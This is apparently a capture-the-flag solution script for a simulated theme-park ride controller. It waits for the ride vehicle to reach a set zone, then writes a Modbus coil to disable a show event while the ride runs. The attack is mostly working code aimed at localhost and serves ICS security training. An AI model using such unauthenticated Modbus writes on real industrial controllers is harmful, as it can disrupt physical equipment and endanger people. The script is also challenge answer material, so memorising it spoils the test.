#!/usr/bin/env python3
"""
Challenge 02: Portal Disruption (100 points)
Difficulty: Easy

Objective: Disable the photo flash event in Scene 4 (Portal Chamber) using
a direct Modbus coil write while the ride is running.

Requirements:
- Ride must be running (state = 2)
- Vehicle must be in Scene 4 zone (positions 9-11)
- Disable event_4_enable via Modbus (coil 11)
- Must be direct Modbus write, not UI control

Educational Value:
- Learn Modbus coil addressing
- Understand event-based show control
- Practice timing attacks
"""

from pymodbus.client import ModbusTcpClient
import time

PLC_HOST = 'localhost'
MAIN_PLC_PORT = 502

def disable_portal_flash():
    """
    Disable the photo flash event in Scene 4
    """
    print("=" * 60)
    print("Challenge 02: Portal Disruption")
    print("=" * 60)
    print()

    client = ModbusTcpClient(PLC_HOST, port=MAIN_PLC_PORT)

    if not client.connect():
        print("✗ Failed to connect to Main PLC")
        return False

    print(f"✓ Connected to Main PLC at {PLC_HOST}:{MAIN_PLC_PORT}")
    print()

    # Check if ride is running
    result = client.read_holding_registers(2, 1, slave=1)
    if result.isError():
        print("✗ Failed to read ride state")
        client.close()
        return False

    state = result.registers[0]
    state_names = ['Idle', 'Starting', 'Running', 'Stopping', 'Emergency']
    print(f"Current State: {state} ({state_names[state] if state < len(state_names) else 'Unknown'})")

    if state != 2:
        print()
        print("⚠️  Ride is not running!")
        print("   Start the ride first, then run this script when the vehicle")
        print("   approaches Scene 4 (Portal Chamber) at positions 9-11.")
        client.close()
        return False

    print()
    print("Monitoring vehicle position...")
    print("Waiting for Scene 4 (Portal Chamber) entry...")
    print()

    # Wait for vehicle to enter Scene 4 zone
    scene_4_entered = False
    for i in range(100):
        result = client.read_holding_registers(1, 1, slave=1)
        if not result.isError():
            position = result.registers[0]

            # Check if in Scene 4 zone (positions 9-11)
            if 9 <= position <= 11 and not scene_4_entered:
                scene_4_entered = True
                print(f"✓ Vehicle entered Scene 4 at position {position}")
                print()
                print("Executing attack...")
                print("  → Writing FALSE to event_4_enable (coil 11)")

                # Disable event 4 (photo flash)
                result = client.write_coil(11, False, slave=1)
                if not result.isError():
                    print("  ✓ Event 4 disabled successfully!")
                    print()
                    print("🎯 Challenge 02 should now be completed!")
                    print("   The photo flash in Scene 4 will not trigger.")
                    print("   Check the CTF dashboard to verify.")
                    client.close()
                    return True
                else:
                    print("  ✗ Failed to write coil")
                    client.close()
                    return False

        time.sleep(0.5)

    print()
    print("✗ Timeout waiting for vehicle to enter Scene 4")
    print("  Make sure the ride is running and try again")

    client.close()
    return False

if __name__ == "__main__":
    try:
        disable_portal_flash()
    except KeyboardInterrupt:
        print("\n\n✗ Attack interrupted by user")
    except Exception as e:
        print(f"\n✗ Attack failed: {e}")
